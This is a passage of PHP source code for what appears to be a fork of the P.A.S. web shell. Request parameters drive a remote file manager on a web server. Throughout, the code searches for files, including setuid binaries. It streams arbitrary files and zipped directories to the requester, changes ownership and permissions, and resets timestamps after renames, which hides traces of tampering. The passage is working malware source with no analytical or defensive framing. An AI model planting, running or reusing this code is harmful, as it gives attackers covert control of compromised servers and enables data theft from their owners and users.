		$v = is_dir($this->fp);
		if(is_bool($v)){
			$this->d = $v;
			return $v;
		}
		if(PHP_VERSION>='5') : if(!isset($this->fi)) $this->spl();
		if($this->fi !== FALSE){
			try{
				$v = $this->fi->isDir();
			}
			catch(Exception $e){
				$v = NULL;
			}
			if(is_bool($v)){
				$this->d = $v;
				return $v;
			}
		}
		endif;
		$this->d = FALSE;
		
		return FALSE;
	}
	
	function isLink() {
	    if (isset($this->l))
	        return $this->l;
	    
	    $v = lstat($this->fp);
	    
	    if (is_array($v)) {
	        $this->l = ($v[2] & 0170000) === 0120000;
	        return $this->l;
	    }
	    if (!isset($this->t))
	        $this->type();
	    if ($this->t !== FALSE) {
	        $this->l = $this->t === 'link';
	        return $this->l;
	    }
	    $v = is_link($this->fp);
	    if (is_bool($v)) {
	        $this->l = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isLink();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->l = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->l = FALSE;
	    return FALSE;
	}
	
	function getLinkTarget() {
	    if (isset($this->f))
	        return $this->f;
	    if (NIX || PHP_VERSION >= '5.3') {
	        $v = readlink($this->fp);
	        if (is_string($v)) {
	            $this->f = $v;
	            return $v;
	        }
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getLinkTarget();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_string($v)) {
	                $this->f = $v;
	                return $v;
	            }
	        }
	    endif;
	    $v = realpath($this->fp);
	    if (is_string($v)) {
	        $this->f = $v;
	        return $v;
	    }
	    $this->f = '';
	    return '';
	}
	
	function getSize() {
	    if (isset($this->s))
	        return $this->s;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->s = $this->i[7];
	        return $this->s;
	    }
	    $v = filesize($this->fp);
	    if (is_int($v)) {
	        $this->s = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getSize();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->s = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->s = -1;
	    return -1;
	}
	
	function getCTime() {
	    if (isset($this->c))
	        return $this->c;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->c = $this->i[10];
	        return $this->c;
	    }
	    $v = filectime($this->fp);
	    if (is_int($v)) {
	        $this->c = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getCTime();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->c = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->c = 0;
	    return 0;
	}
	
	function getMTime() {
	    if (isset($this->m))
	        return $this->m;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->m = $this->i[9];
	        return $this->m;
	    }
	    $v = filemtime($this->fp);
	    if (is_int($v)) {
	        $this->m = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getMTime();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->m = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->m = 0;
	    return 0;
	}
	
	function getOwner() {
	    if (isset($this->o))
	        return $this->o;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->o = $this->i[4];
	        return $this->o;
	    }
	    $v = fileowner($this->fp);
	    if (is_int($v)) {
	        $this->o = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getOwner();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->o = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->o = -1;
	    return -1;
	}
	
	function getGroup() {
	    if (isset($this->g))
	        return $this->g;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->g = $this->i[5];
	        return $this->g;
	    }
	    $v = filegroup($this->fp);
	    if (is_int($v)) {
	        $this->g = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getGroup();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->g = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->g = -1;
	    return -1;
	}
	
	function getPerms() {
	    if (isset($this->p))
	        return $this->p;
	    if (!isset($this->i))
	        $this->stat();
	    if ($this->i !== FALSE) {
	        $this->p = $this->i[2];
	        return $this->p;
	    }
	    $v = fileperms($this->fp);
	    if (is_int($v)) {
	        $this->p = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getPerms();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_int($v)) {
	                $this->p = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->p = 0;
	    return 0;
	}
	
	function isReadable() {
	    if (isset($this->r))
	        return $this->r;
	    $v = is_readable($this->fp);
	    if (is_bool($v)) {
	        $this->r = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isReadable();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->r = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->r = FALSE;
	    return FALSE;
	}
	
	function isWritable() {
	    if (isset($this->w))
	        return $this->w;
	    $v = is_writable($this->fp);
	    if (is_bool($v)) {
	        $this->w = $v;
	        return $v;
	    }
	    if (PHP_VERSION >= '5'):
	        if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->isWritable();
	            }
	            catch (Exception $e) {
	                $v = NULL;
	            }
	            if (is_bool($v)) {
	                $this->w = $v;
	                return $v;
	            }
	        }
	    endif;
	    $this->w = FALSE;
	    return FALSE;
	}
	
	function getMode() {
	    $v = 0;
	    if ($this->isReadable())
	        $v += 1;
	    if ($this->isWritable())
	        $v += 2;
	    return $v;
	}
	
	function stat() {
	    $v = stat($this->fp);
	    if (is_array($v)) {
	        $this->i = $v;
	        return;
	    }
	    $v       = lstat($this->fp);
	    $this->i = is_array($v) ? $v : FALSE;
	}
	
	function type() {
	    $v       = filetype($this->rp);
	    $this->t = $v ? $v : FALSE;
	}
	
	function spl() {
	    $this->fi = FALSE;
	    if (PHP_VERSION >= '5'):
	        if (PHP_VERSION >= '5.1.2') {
	            try {
	                $this->fi = new SplFileInfo($this->rp);
	            }
	            catch (Exception $e) {
	                $this->fi = FALSE;
	            }
	        }
	    endif;
	}
	
}


if(isset($D['a'])){
	
	class PZIP {
	    var $_bpl = '', $_cdfh = NULL, $_cdfp = NULL, $_cdfo = FALSE, $_cdrc = 0, $_cdso = 0, $_flrs = array();
	    function init($bp='') {
	        $this->_bpl = strlen($bp);
	        if ($h = tmpfile())
	            $this->_cdfh = $h;
	        else {
	            $n = tempName();
	            $a = array(
	                'upload_tmp_dir',
	                'session.save_path',
	                'user_dir',
	                'doc_root'
	            );
	            foreach ($a as $v)
	                if ($p = ini_get($v)) {
	                    $p .= DSC . $n;
	                    if ($h = fopen($p, 'bw+')) {
	                        flock($h, LOCK_EX);
	                        $this->_cdfh = $h;
	                        $this->_cdfp = $p;
	                        return TRUE;
	                    }
	                    if (PHP_VERSION >= '5'):
	                        if (PHP_VERSION >= '5.1') {
	                            try {
	                                $h = new SplFileObject($p, 'bw+');
	                            }
	                            catch (Exception $e) {
	                                $h = NULL;
	                            }
	                            if ($h) {
	                                $h->flock(LOCK_EX);
	                                $this->_cdfh = $h;
	                                $this->_cdfp = $p;
	                                $this->_cdfo = TRUE;
	                                return TRUE;
	                            }
	                        }
	                    endif;
	                }
	            $p = selfPath() . $n;
	            if ($h = fopen($p, 'bw+')) {
	                flock($h, LOCK_EX);
	                $this->_cdfh = $h;
	                $this->_cdfp = $p;
	                return TRUE;
	            }
	            if (PHP_VERSION >= '5'):
	                if (PHP_VERSION >= '5.1') {
	                    try {
	                        $h = new SplFileObject($p, 'bw+');
	                    }
	                    catch (Exception $e) {
	                        $h = NULL;
	                    }
	                    if ($h) {
	                        $h->flock(LOCK_EX);
	                        $this->_cdfh = $h;
	                        $this->_cdfp = $p;
	                        $this->_cdfo = TRUE;
	                        return TRUE;
	                    }
	                }
	            endif;
	        }
	        return FALSE;
	    }
	    function fileHeader($n, $t) {
	        echo "\x50\x4b\x03\x04\x14\x00\x08\x00\x00\x00", $t, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", pack('v', strlen($n)), "\x00\x00", $n;
	        ob_start('zipCalc', 1048576);
	    }
	    function fileFooter($n, $t) {
	        ob_end_flush();
	        $v = zipCalc(NULL);
	        $s = pack('V', $v[0]);
	        $c = pack('V', $v[1] ^ 0xffffffff);
	        echo "\x50\x4b\x07\x08", $c, $s, $s;
	        $fh   = $this->_cdfh;
	        $nl   = strlen($n);
	        $data = "\x50\x4b\x01\x02\x00\x00\x14\x00\x08\x00\x00\x00" . $t . $c . $s . $s . pack('v', $nl) . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" . pack('V', $this->_cdso) . $n;
	        if ($this->_cdfo) {
	            $fh->fwrite($data);
	            $fh->fflush();
	        } else {
	            fwrite($fh, $data);
	            fflush($fh);
	        }
	        ++$this->_cdrc;
	        $this->_cdso += 46 + $v[0] + $nl;
	    }
	    function addPath($p) {
	        $f = new FileInfo($p);
	        if ($f->isDir()) {
	            if (substr($p, -1) !== DSC)
	                $p .= DSC;
	            $f = NULL;
	            if (!dirRead($p, array(
	                &$this,
	                'addPath'
	            )))
	                $this->_flrs[] = substr($p, $this->_bpl);
	        } else {
	            $t = packTime($f->getMTime());
	            $f = substr($p, $this->_bpl);
	            if (!NIX)
	                $f = str_replace(DSC, '/', $f);
	            $this->fileHeader($f, $t);
	            if (!outFile($p))
	                $this->_flrs[] = $f;
	            $this->fileFooter($f, $t);
	        }
	    }
	    function close() {
	        if (count($this->_flrs) > 0) {
	            $n = 'CANT_READ.txt';
	            $t = packTime(time());
	            $this->fileHeader($n, $t);
	            foreach ($this->_flrs as $v)
	                echo $v, "\n";
	            $this->fileFooter($n, $t);
	        }
	        $fh = $this->_cdfh;
	        if ($this->_cdfo) {
	            $s = $fh->ftell();
	            $fh->fseek(0);
	            if (!is_int($fh->fpassthru()))
	                while (!$fh->eof())
	                    echo $fh->fread(1048576);
	            $fh->flock(LOCK_UN);
	            unset($fh, $this->_cdfh);
	        } else {
	            $s = ftell($fh);
	            fseek($fh, 0);
	            if (!is_int(fpassthru($fh)))
	                while (!feof($fh))
	                    echo fread($fh, 1048576);
	            flock($fh, LOCK_UN);
	            fclose($fh);
	        }
	        if ($this->_cdfp !== NULL)
	            delFile($this->_cdfp);
	        $v = pack('v', $this->_cdrc);
	        $c = 'Archived by P.A.S. Fork v. ' . VER;
	        echo "\x50\x4b\x05\x06\x00\x00\x00\x00", $v, $v, pack('V', $s), pack('V', $this->_cdso), pack('v', strlen($c)), $c;
	        sDie();
	    }
}
	
function packTime($v) {
    $v = getdate($v);
    return pack('vv', (($v['hours'] << 11) + ($v['minutes'] << 5) + $v['seconds'] >> 1), ((($v['year'] - 1980) << 9) + ($v['mon'] << 5) + $v['mday']));
}

if (!defined('PHP_INT_MAX'))
    define('PHP_INT_MAX', intval('10000000000000000000'));
    
function zipCalc($buff) {
    static $crcTbl = NULL, $chrTbl = NULL, $dataSize = 0, $crcSum = 0xffffffff, $shftFix = 0;
    if ($crcTbl === NULL) {
        $shftFix = PHP_INT_MAX >> 0;
        for ($i = 0; $i < 256; ++$i) {
            $v = $i;
            for ($j = 8; $j; --$j)
                $v = $v & 1 ? $v >> 1 & $shftFix ^ 0xEDB88320 : $v >> 1 & $shftFix;
            $crcTbl[]        = $v;
            $chrTbl[chr($i)] = $i;
        }
        $shftFix = PHP_INT_MAX >> 7;
    } elseif ($buff === NULL) {
        $v        = array(
            $dataSize,
            $crcSum
        );
        $dataSize = 0;
        $crcSum   = 0xffffffff;
        return $v;
    }
    $c = strlen($buff);
    $dataSize += $c;
    for ($i = 0; $i < $c; ++$i)
        $crcSum = $crcTbl[$crcSum & 0xFF ^ $chrTbl[$buff[$i]]] ^ $crcSum >> 8 & $shftFix;
    return $buff;
}

function jsonEcho($v) {
    static $s = NULL, $r = NULL;
    if ($s === NULL) {
        $s = array(
            '\\',
            '"'
        );
        $r = array(
            '\u005c',
            '\u0022'
        );
        for ($i = 0; $i <= 0x1F; ++$i) {
            $s[] = chr($i);
            $r[] = sprintf('\u00%02s', dechex($i));
        }
    }
    echo $v === NULL ? '"NULL"' : '"' . str_replace($s, $r, $v) . '"';
}

switch ($D['a']) {
    case 'f':
        function testProp($a, $v) {
            foreach ($a as $i)
                if (is_array($i)) {
                    if (count($i) === 2) {
                        if ($v > $i[0] && $v < $i[1])
                            return TRUE;
                    } elseif (isset($i[0])) {
                        if ($v > $i[0])
                            return TRUE;
                    } elseif ($v < $i[1])
                        return TRUE;
                } elseif ($v === $i)
                    return TRUE;
            return FALSE;
        }
        class Searcher {
            var $f, $d, $p, $a;
            function __construct($v) {
                echo '{"f":[';
                $this->f = $v;
                $this->d = 0;
                $this->p = NULL;
                $this->a = array();
            }
            function filter($v) {
                $i = new FileInfo($v);
                $k = $i->getFileName();
                $f = $this->f;
                if ($k === '.' || $k === '..')
                    return;
                if ($i->isLink() && !isset($f['l']))
                    return;
                $b = $i->isDir();
                if ($b && (!isset($f['d']) || $f['d'] > $this->d))
                    $this->a[] = $v;
                if (isset($f['y']) && ($f['y'] === 1 ? !$b : $b))
                    return;
                if (isset($f['p']) && $i->getMode() < $f['p'])
                    return;
                if (!$b && isset($f['u']) && ($i->getPerms() & 0007000) !== 0004000)
                    return;
                if (isset($f['n'])) {
                    if ($k !== $f['n'])
                        return;
                } elseif (isset($f['i'])) {
                    if (strcasecmp($k, $f['i']) !== 0)
                        return;
                } elseif (isset($f['r'])) {
                    if (!preg_match($f['r'], $k))
                        return;
                }
                if (isset($f['o']) && !testProp($f['o'], $i->getOwner()))
                    return;
                if (isset($f['g']) && !testProp($f['g'], $i->getGroup()))
                    return;
                if (isset($f['e']) && !testProp($f['e'], $i->getCTime()))
                    return;
                if (isset($f['m']) && !testProp($f['m'], $i->getMTime()))
                    return;
                if (!$b && isset($f['z']) && !testProp($f['z'], $i->getSize()))
                    return;
                if (!$b && (isset($f['t']) || isset($f['v']) || isset($f['x']))) {
                    if (!is_string($k = getFile($v)))
                        return;
                    if (isset($f['t'])) {
                        if (strpos($k, $f['t']) === FALSE)
                            return;
                    } elseif (isset($f['v'])) {
                        if (stristr($k, $f['v']) === FALSE)
                            return;
                    } elseif (!preg_match($f['x'], $k))
                        return;
                }
                $k = $i->getPath();
                if ($this->p !== $k) {
                    if ($this->p !== NULL)
                        echo ']},';
                    echo '{"p":';
                    jsonEcho($k);
                    $this->p = $k;
                    $k       = new FileInfo($k);
                    echo ',"m":', $k->getMode(), ',"f":[';
                }
                outFileInfo($i);
            }
            function search($v) {
                $this->a = array();
                dirRead($v, array(
                    &$this,
                    'filter'
                ));
                if (!isset($this->f['d']) || $this->f['d'] > $this->d) {
                    ++$this->d;
                    $a = $this->a;
                    foreach ($a as $v)
                        $this->search($v);
                }
            }
            function finish() {
                if ($this->p !== NULL) {
                    echo ']}]';
                    outFileInfo(NULL, TRUE);
                } else
                    echo ']';
                sDie('}');
            }
        }
        function dirRead($p, $f) {
            $b = is_string($f);
            if (substr($p, -1) !== DSC)
                $p .= DSC;
            if ($v = opendir($p)) {
                while (($i = readdir($v)) !== FALSE)
                    if ($i !== '.' && $i !== '..')
                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                closedir($v);
                return TRUE;
            }
            if ($v = dir($p)) {
                while (($i = $v->read()) !== FALSE)
                    if ($i !== '.' && $i !== '..')
                        $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                $v->close();
                return TRUE;
            }
            if (PHP_VERSION >= '5'):
                try {
                    $v = new DirectoryIterator($p);
                }
                catch (Exception $e) {
                    $v = FALSE;
                }
                if ($v) {
                    foreach ($v as $i) {
                        $n = $i->getFileName();
                        if ($n !== '.' && $n !== '..')
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                    }
                    unset($i, $v);
                    return TRUE;
                }
                try {
                    $v = new RecursiveDirectoryIterator($p);
                }
                catch (Exception $e) {
                    $v = FALSE;
                }
                if ($v) {
                    foreach ($v as $i)
                        $b ? $f($i) : $f[0]->{$f[1]}($i);
                    unset($i, $v);
                    return TRUE;
                }
                if (PHP_VERSION >= '5.3') {
                    try {
                        $v = new FilesystemIterator($p);
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v) {
                        foreach ($v as $i)
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                        unset($i, $v);
                        return TRUE;
                    }
                }
                $v = defined('SCANDIR_SORT_NONE') ? scandir($p, SCANDIR_SORT_NONE) : scandir($p);
                if ($v !== FALSE) {
                    foreach ($v as $i)
                        if ($i !== '.' && $i !== '..')
                            $b ? $f($p . $i) : $f[0]->{$f[1]}($p . $i);
                    return TRUE;
                }
            endif;
            if (PHP_VERSION >= '4.3' && defined('GLOB_BRACE') && ($v = glob($p . DSC . '{,.}*', GLOB_NOESCAPE | GLOB_NOSORT | GLOB_BRACE))) {
                foreach ($v as $i) {
                    $n = fileName($i);
                    if ($n !== '.' && $n !== '..')
                        $b ? $f($i) : $f[0]->{$f[1]}($i);
                }
                return TRUE;
            }
            if (PHP_VERSION >= '5'):
                if (PHP_VERSION >= '5.3') {
                    try {
                        $v = new GlobIterator($p . '*');
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v && count($v) > 0) {
                        foreach ($v as $i)
                            $b ? $f($i) : $f[0]->{$f[1]}($i);
                        unset($i, $v);
                        return TRUE;
                    }
                }
            endif;
            return FALSE;
        }
        function delDir($p) {
            dirRead($p, 'delFOD');
            return rmdir($p);
        }
        function delFOD($f) {
            $f = new FileInfo($f);
            $n = $f->getFileName();
            if ($n !== '.' && $n !== '..')
                return (!$f->isLink() && $f->isDir()) ? delDir($f->getPathName()) : delFile($f->getPathName());
        }
        function isInt($v) {
            return (string) $v === (string) (int) $v;
        }
        function jsonFileInfo($f, $b) {
            echo '[';
            jsonEcho($b ? $f->getPathName() : $f->getFileName());
            echo ',', $f->isDir() ? 'null' : $f->getSize(), ',', (TM ? $f->getCTime() : $f->getMTime()), ',', $f->getMode(), ',"', $f->getPerms(), '"';
            if (NIX) {
                echo ',', $f->getOwner(), ',', $f->getGroup();
                if ($b) {
                    echo ',';
                    jsonEcho(uName($f->getOwner()));
                    echo ',';
                    jsonEcho(gName($f->getGroup()));
                }
            }
            if ($f->isLink()) {
                echo ',';
                jsonEcho($f->getLinkTarget());
            }
            echo ']';
        }
        function outFileInfo($f, $b = NULL) {
            static $p = NULL, $o = array(), $g = array();
            if ($b === TRUE) {
                if (!NIX || count($o) === 0)
                    return;
                $b = FALSE;
                echo ',"o":{';
                foreach ($o as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '"', $k, '":';
                    jsonEcho(uName($k));
                }
                $b = FALSE;
                echo '},"g":{';
                foreach ($g as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '"', $k, '":';
                    jsonEcho(gName($k));
                }
                echo '}';
                return;
            }
            if ($b === FALSE) {
                $p = NULL;
                return;
            }
            if (!isset($f->fp))
                $f = new FileInfo($f);
            if ($p === $f->getPath())
                echo ',';
            else
                $p = $f->getPath();
            jsonFileInfo($f, FALSE);
            if (NIX) {
                $o[$f->getOwner()] = 1;
                $g[$f->getGroup()] = 1;
            }
        }
        function outFile($p) {
						
            if (RO && is_int(readfile($p))){
                return TRUE;
			}

            if (RO && copy($p, 'php://output'))
                return TRUE;
            
            
            if ($v = fopen($p, 'rb')) {
                if (!is_int(fpassthru($v)))
                    while (!feof($v))
                        echo fread($v, 1048576);
                fclose($v);
                return TRUE;
            }
            if (defined('FORCE_GZIP')) {
                if (RO && is_int(readgzfile($p)))
                    return TRUE;
                if ($v = gzopen($p)) {
                    if (!is_int(gzpassthru($v)))
                        while (!gzeof($v))
                            echo gzread($v, 1048576);
                    gzclose($v);
                    return TRUE;
                }
            }
            if (PHP_VERSION >= '5'):
                if (PHP_VERSION >= '5.1') {
                    try {
                        $v = new SplFileObject($p, 'rb');
                    }
                    catch (Exception $e) {
                        $v = FALSE;
                    }
                    if ($v) {
                        if (!is_int($v->fpassthru()))
                            while (!$v->eof())
                                echo $v->fgets();
                        unset($v);
                        return TRUE;
                    }
                }
            endif;
            if (PHP_VERSION >= '4.3') {
                $v = file_get_contents($p);
                if (is_string($v)) {
                    echo $v;
                    return TRUE;
                }
            }
            $v = file($p);
            if (is_array($v)) {
                foreach ($v as $i)
                    echo $i;
                return TRUE;
            }
            if (defined('FORCE_GZIP')) {
                $v = gzfile($p);
                if (is_array($v)) {
                    foreach ($v as $i)
                        echo $i;
                    return TRUE;
                }
            }
            return FALSE;
        }
        if (isset($D['s'])) {
            $a = array();
            $e = '{"e":"You have syntax error in %s pattern"}';
            if (isset($D['n'])) {
                if (isset($D['w'])) {
                    $r = '#^';
                    $c = '';
                    $p = '';
                    $q = 0;
                    $b = FALSE;
                    for ($i = 0, $l = strlen($D['n']); $i < $l; ++$i) {
                        $c = $D['n'][$i];
                        if ($q > 0 && $c !== '?') {
                            $r .= '.';
                            if ($q > 1)
                                $r .= '{' . $q . '}';
                            $q = 0;
                        }
                        switch ($c) {
                            case '*':
                                if ($c !== $p)
                                    $r .= '.*';
                                break;
                            case '?':
                                ++$q;
                                break;
                            case '\\':
                                if ($i + 1 >= $l)
                                    sDie(sprintf($e, 'name'));
                                $r .= $c . $D['n'][++$i];
                                break;
                            case '[':
                                ++$b;
                                $r .= $c;
                                break;
                            case ']':
                                --$b;
                                $r .= $c;
                                break;
                            case '-':
                                $r .= $b > 0 ? $c : '\\-';
                                break;
                            case '!':
                                $r .= $p === '[' ? '^' : '\\!';
                                break;
                            default:
                                $r .= addcslashes($c, '.+^$(){}=<>|:#');
                                break;
                        }
                        $p = $c;
                    }
                    if ($q > 0) {
                        $r .= '.';
                        if ($q > 1)
                            $r .= '{' . $q . '}';
                    }
                    $r .= '$#';
                    if (isset($D['i']))
                        $r .= 'i';
                    if (preg_match($r, '') === FALSE)
                        sDie(sprintf($e, 'name'));
                    $a['r'] = $r;
                } elseif (isset($D['i']))
                    $a['i'] = $D['n'];
                else
                    $a['n'] = $D['n'];
            }
            if (isset($D['t'])) {
                if (isset($D['x'])) {
                    if (preg_match('#' . $D['x'] . '#', '') === FALSE)
                        sDie(sprintf($e, 'text'));
                    $a['x'] = '#' . $D['t'] . '#';
                    if (isset($D['v']))
                        $a['x'] .= 'i';
                } elseif (isset($D['v']))
                    $a['v'] = $D['t'];
                else
                    $a['t'] = $D['t'];
            }
            $i = array(
                'l',
                'd',
                'y',
                'p',
                'u'
            );
            foreach ($i as $k)
                if (isset($D[$k]))
                    $a[$k] = (int) $D[$k];
            $i = array(
                'o',
                'g',
                'z'
            );
            foreach ($i as $k)
                if (isset($D[$k])) {
                    $s = explode(',', $D[$k]);
                    foreach ($s as $n => $v)
                        if (strpos($v, '-')) {
                            $v         = explode('-', $v, 2);
                            $a[$k][$n] = array(
                                (int) $v[0],
                                (int) $v[1]
                            );
                        } else
                            switch (substr(trim($v), 0, 1)) {
                                case '>':
                                    $a[$k][$n][0] = (int) substr(trim($v), 1);
                                    break;
                                case '<':
                                    $a[$k][$n][1] = (int) substr(trim($v), 1);
                                    break;
                                default:
                                    $a[$k][$n] = (int) $v;
                                    break;
                            }
                }
            $i = array(
                'e',
                'm'
            );
            foreach ($i as $k)
                if (isset($D[$k])) {
                    $s = explode(',', $D[$k]);
                    foreach ($s as $n => $v)
                        if (strpos(' - ', $v)) {
                            $v         = explode(' - ', $v, 2);
                            $a[$k][$n] = array(
                                strtotime(trim($v[0]) . 'UTC'),
                                strtotime(trim($v[1]) . 'UTC')
                            );
                        } else
                            switch (substr(trim($v), 0, 1)) {
                                case '>':
                                    $a[$k][$n][0] = strtotime(substr(trim($v), 1) . 'UTC');
                                    break;
                                case '<':
                                    $a[$k][$n][1] = strtotime(substr(trim($v), 1) . 'UTC');
                                    break;
                                default:
                                    $a[$k][$n] = strtotime(trim($v) . 'UTC');
                                    break;
                            }
                }
            $s = new Searcher($a);
            foreach ($D['s'] as $v)
                $s->search($v);
            $s->finish();
        }
        if (isset($D['g'])) {
            if ($D['g'] === '~' || $D['g'] === '')
                $D['g'] = selfPath();
            $i = new FileInfo($D['g']);
            if (substr($D['g'], -1) === DSC || $i->isDir()) {
                echo '{"p":';
                if (substr($D['g'], -1) !== DSC)
                    $D['g'] .= DSC;
                jsonEcho($D['g']);
                echo ',"m":', $i->getMode(), ',"f":[';
                dirRead($i->getPathName(), 'outFileInfo');
                echo ']';
                outFileInfo(NULL, TRUE);
                sDie('}');
            }
            echo "\x01\x02";
            $b = outFile($D['g']);
            echo "\x03\x1E";
            if ($b) {
                echo "\x06[";
                jsonEcho($D['g']);
                echo ',', $i->getMode(), ']';
            } else
                echo "\x15", $D['g'];
            sDie("\x17\x04\x10");
        }
        if (isset($D['i'])) {
            jsonFileInfo(new FileInfo($D['i']), TRUE);
            sDie();
        }
        if (isset($D['h'])) {
            echo '{';
            $a = array();
            $t = array();
            $e = array();
            $b = NULL;
            $m = count($D['h']) > 1;
            if ($m && isset($D['p']) && substr($D['p'], -1) !== DSC)
                $D['p'] .= DSC;
            if (isset($D['t']))
                $D['t'] = strtotime($D['t'] . 'UTC');
            if (isset($D['e']))
                $D['e'] = intval($D['e'], 8);
            if (isset($D['r']) && isInt($D['r']))
                $D['r'] = (int) $D['r'];
            if (isset($D['o']) && isInt($D['o']))
                $D['o'] = (int) $D['o'];
            sort($D['h']);
            foreach ($D['h'] as $v) {
                if (isset($D['p'])) {
                    parsePath($v, $s, $n);
                    if ($m) {
                        $d = $D['p'];
                        $p = $d . $n;
                    } else {
                        $d = filePath($D['p']);
                        $p = $D['p'];
                    }
                    $c = array();
                    if (!isset($t[$s])) {
                        $i = new FileInfo($s);
                        $i = $i->getMTime();
                        if ($i)
                            $c[$s] = $i;
                    }
                    if (!isset($t[$d])) {
                        $i = new FileInfo($d);
                        $i = $i->getMTime();
                        if ($i)
                            $c[$d] = $i;
                    } else
                        $i = $t[$d];
                    if (!isset($D['t']) && $i)
                        $c[$p] = $i;
                    if (rename($v, $p)) {
                        if ($s !== $b) {
                            echo $b === NULL ? '"r":[' : ']},';
                            echo '{"p":';
                            jsonEcho($s);
                            echo ',"f":[';
                            $b = $s;
                        } else
                            echo ',';
                        jsonEcho($n);
                        $t += $c;
                        $v     = $p;
                        $a[$p] = 1;
                    } else
                        $e[$v][] = 'path';
                }
                if (isset($D['t'])) {
                    if (touch($v, $D['t']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'modified date';
                }
                if (isset($D['e'])) {
                    if (chmod($v, $D['e']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'permission';
                }
                if (isset($D['r'])) {
                    if (chgrp($v, $D['r']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'group';
                }
                if (isset($D['o'])) {
                    if (chown($v, $D['o']))
                        $a[$v] = 1;
                    else
                        $e[$v][] = 'owner';
                }
            }
            $b = $b !== NULL;
            if ($b)
                echo ']}]';
            if (count($a) > 0) {
                if ($b)
                    echo ',';
                else
                    $b = TRUE;
                echo '"c":[{"p":';
                foreach ($t as $k => $v)
                    touch($k, $v);
                clearstatcache();
                ksort($a);
                $p = NULL;
                foreach ($a as $v => $k) {
                    $k = filePath($v);
                    if ($k !== $p) {
                        if ($p !== NULL)
                            echo ']},{"p":';
                        jsonEcho($k);
                        echo ',"f":[';
                        $p = $k;
                    }
                    outFileInfo($v);
                }
                echo ']}]';
                outFileInfo(NULL, TRUE);
            }
            if ($e) {
                if ($b)
                    echo ',';
                $b = FALSE;
                echo '"e":[';
                foreach ($e as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho(implode(', ', $v) . ' for ' . $k);
                }
                echo ']';
            }
            sDie('}');
        }
        if (isset($D['d'])) {
            if (is_array($D['d'])) {
                $v = new PZIP();
                $v->init($D['DBP']);
                foreach ($D['d'] as $i)
                    $v->addPath($i);
                $v->close();
            }
            $v = new FileInfo($D['d']);
            if ($v->isDir()) {
                $v = new PZIP();
                $v->init($D['d']);
                $v->addPath($D['d']);
                $v->close();
            }
            if (outFile($D['d']) || defined('CED'))
                sDie();
            header('Content-Disposition: inline');
